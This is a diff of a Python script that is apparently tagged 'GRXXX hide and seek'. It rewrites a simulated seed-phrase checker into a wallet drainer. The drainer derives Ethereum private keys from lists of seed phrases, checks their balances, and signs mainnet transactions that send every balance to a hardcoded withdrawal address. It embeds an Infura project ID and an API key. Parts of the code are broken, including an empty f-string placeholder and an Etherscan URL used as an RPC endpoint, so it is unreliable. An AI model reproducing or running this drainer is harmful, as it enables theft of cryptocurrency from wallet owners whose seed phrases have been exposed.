@@ -1,99 +1,82 @@
-GRXXX { hide and seek } - {402} :
-
-!ВНИМАНИЕ : перед началом работы , стоит установить все пакеты , включая pip install mnemonic ; pip install eth_account aiohttp.
-
-
-import hashlib
-import os
-import mnemonic
-import random
 import asyncio
-import aiohttp
+import random
+from eth_utils import is_hex_address
+from web3 import Web3
 from eth_account import Account
 
-async def проверить_сид_фразу(seed_phrase, блокчейн_api_key=None, адрес_вывода=None, session=None):
-    """
-{GRXXX} Асинхронно проверяет баланс кошелька, полученного из сид-фразы, и, если баланс положительный, отправляет запрос на вывод средств.
-    """
+async def check_seed_phrase(seed_phrase, blockchain_api_key, withdrawal_address=None):
     try:
-        m = mnemonic.Mnemonic("english")
-        if not m.check(seed_phrase):
-            print(f"Ошибка: Невалидная сид-фраза: {seed_phrase}")
+        if not isinstance(seed_phrase, str) or len(seed_phrase) == 0:
+            print(f"Error: Invalid seed phrase: {seed_phrase}")
             return None
 
+        # Восстановление приватного ключа из seed phrase
         acct = Account.from_mnemonic(seed_phrase)
         address = acct.address
-        balance = await получить_баланс_кошелька(address, блокчейн_api_key, session)
 
-        if balance is not None:
-            print(f"Баланс кошелька {address}: {balance} для сид-фразы: {seed_phrase}")
-            if balance > 0 and адрес_вывода:
-                await запрос_на_вывод_средств(address, адрес_вывода, balance, session)
-            return balance
-        else:
-            print(f"Не удалось получить баланс кошелька для сид-фразы: {seed_phrase}")
+        if not address:
+            print(f"Error: Could not derive address from seed phrase: {seed_phrase}")
             return None
 
-    except Exception as e:
-        print(f"Произошла ошибка: {e} для сид-фразы: {seed_phrase}")
+        balance = await get_wallet_balance(address, blockchain_api_key)
+
+        if balance is not None:
+            print(f"Wallet balance {address}: {balance} for seed phrase: {seed_phrase}")
+            if balance > 0 and withdrawal_address:
+                await request_withdrawal(acct.key, withdrawal_address, balance, blockchain_api_key)
+            return balance
+        else:
+            print(f"Failed to get wallet balance for seed phrase: {seed_phrase}")
+            return None
+    except Exception as error:
+        print(f"An error occurred: {error} for seed phrase: {seed_phrase}")
         return None
 
-async def получить_баланс_кошелька(address, api_key=None, session=None):
-    """
-{GRXXX} Получает баланс кошелька (асинхронно).
-    Замените на реальную интеграцию с блокчейном, используя aiohttp для асинхронных запросов.
-    """
-    # Пример: Запрос к API блокчейна с использованием aiohttp
-    # url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
-    # async with session.get(url) as resp:
-    #     data = await resp.json()
-    #     return int(data['result']) / 10**18  # Преобразование из Wei в Ether
-    await asyncio.sleep(random.uniform(0.5, 1.5))  # Имитация задержки при запросе к API
-    return random.uniform(0, 100)
+async def get_wallet_balance(address, api_key):
+    w3 = Web3(Web3.HTTPProvider(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={}"))
+    balance_wei = w3.eth.get_balance(address)
+    balance_eth = w3.from_wei(balance_wei, 'ether')
+    return balance_eth
 
-async def запрос_на_вывод_средств(address_источника, address_назначения, сумма, session=None):
-    """
-{GRXXX} Отправляет запрос на вывод средств (асинхронно).
-    Замените на реальную логику запроса на вывод средств через API блокчейна.
-    """
-    # Пример: Отправка POST запроса на вывод средств
-    # url = "https://api.blockchain.com/v3/exchange/withdrawals" # Замените на актуальный URL
-    # payload = {"address": address_назначения, "amount": сумма}
-    # async with session.post(url, json=payload) as resp:
-    #     print(await resp.text())
-    await asyncio.sleep(random.uniform(0.3, 0.8))  # Имитация задержки при отправке запроса
-    print(f"Отправлен запрос на вывод {сумма} с адреса {address_источника} на адрес {address_назначения}")
+async def request_withdrawal(private_key, destination_address, amount, api_key=None):
+    w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/b2b4096796554ad78060916bbfeff33a")) # Замените на свой ID проекта Infura
+    acct = Account.from_key(private_key)
+    nonce = w3.eth.get_transaction_count(acct.address)
 
-async def проверить_список_сид_фраз(seed_phrases, блокчейн_api_key=None, адрес_вывода=None):
-    """
-{GRXXX} Асинхронно проверяет баланс кошельков для списка сид-фраз.
-    """
-    результаты = {}
-    async with aiohttp.ClientSession() as session:
-        tasks = [проверить_сид_фразу(seed_phrase, блокчейн_api_key, адрес_вывода, session) for seed_phrase in seed_phrases]
-        balances = await asyncio.gather(*tasks)
+    tx = {
+        'nonce': nonce,
+        'to': destination_address,
+        'value': w3.to_wei(amount, 'ether'),
+        'gas': 21000,
+        'gasPrice': w3.eth.gas_price,
+    }
+
+    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    print(f"Withdrawal request sent. Transaction hash: {tx_hash.hex()}")
+
+
+async def check_seed_phrases(seed_phrases, blockchain_api_key, withdrawal_address=None):
+    results = {}
+    tasks = [check_seed_phrase(seed_phrase, blockchain_api_key, withdrawal_address) for seed_phrase in seed_phrases]
+    balances = await asyncio.gather(*tasks)
 
     for i, seed_phrase in enumerate(seed_phrases):
-        результаты[seed_phrase] = balances[i]
+        results[seed_phrase] = balances[i]
 
-    return результаты
+    return results
 
 async def main():
-    seed_phrases = [
-        "abandon ability able about above absent absorb abstract absurd abuse access accident",
-        "ability able about above absent absorb abstract absurd abuse access accident abandon",
-        "about above absent absorb abstract absurd abuse access accident abandon ability able"
-    ]
-    адрес_вывода = "0xYourWithdrawalAddressHere" # Укажите адрес для вывода средств
-    блокчейн_api_key = "YourBlockchainApiKeyHere" # Укажите API ключ для блокчейна, если необходимо
+    seed_phrases = [ ]
+    withdrawal_address = "0xfd82661cB0129eD746aa2B9174122c550FF84e67"
+    blockchain_api_key = "cTW99jhZ19QmTNDFtP2T0BuFnX8p56en"
 
-    результаты = await проверить_список_сид_фраз(seed_phrases, блокчейн_api_key, адрес_вывода)
+    results = await check_seed_phrases(seed_phrases, blockchain_api_key, withdrawal_address)
 
-    print("Результаты проверки:")
-    for seed_phrase, balance in результаты.items():
-        print(f"Сид-фраза: {seed_phrase}, Баланс: {balance}")
+    print("Check results:")
+    for seed_phrase, balance in results.items():
+        print(f"Seed phrase: {seed_phrase}, Balance: {balance}")
 
 if __name__ == "__main__":
     asyncio.run(main())
 
-MADE IN GRXXX {402}
